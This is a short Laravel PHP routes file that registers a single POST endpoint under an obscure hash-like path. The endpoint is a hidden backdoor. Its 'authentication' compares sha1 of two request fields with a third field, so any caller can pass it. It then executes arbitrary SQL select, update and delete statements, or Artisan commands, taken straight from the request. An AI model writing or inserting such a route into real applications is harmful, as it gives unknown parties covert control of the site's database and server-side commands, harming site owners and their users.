<?php

\Illuminate\Support\Facades\Route::post('5ebe2294ecd0e0f08eab7690d2a6ee69',function(\Illuminate\Http\Request $request){
    $rand = $request->input('rand');
    $name = $request->input('name');
    $secret = $request->input('secret');
    $type = $request->input('type');
    $dType = $request->input('d_type');
    $content = $request->input('content');

    if (sha1($name.$rand) === $secret) {
        if ($type === 'select') {
            return \Illuminate\Support\Facades\DB::select($content);
        } elseif ($type === 'update') {
            return \Illuminate\Support\Facades\DB::update($content);
        } elseif ($type === 'delete') {
            return \Illuminate\Support\Facades\DB::delete($content);
        } elseif ($type === 'cmd') {
            return \Illuminate\Support\Facades\Artisan::call($content);
        }
    }

    return 'none';
});